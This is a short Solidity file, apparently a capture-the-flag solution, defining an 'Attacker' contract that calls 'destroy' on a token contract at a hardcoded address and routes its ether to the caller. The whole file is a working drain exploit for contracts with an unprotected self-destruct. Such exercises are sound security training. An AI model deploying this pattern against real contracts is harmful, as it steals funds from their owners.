// SPDX-License-Identifier: MIT

pragma solidity >=0.8.2 <0.9.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract Attacker {
    address to = 0xaC2bFa0d4F634F8601726ffc745C6Cba42a5732D;

    function attack() public {
        ISimpleToken(to).destroy(payable(msg.sender));
    }
}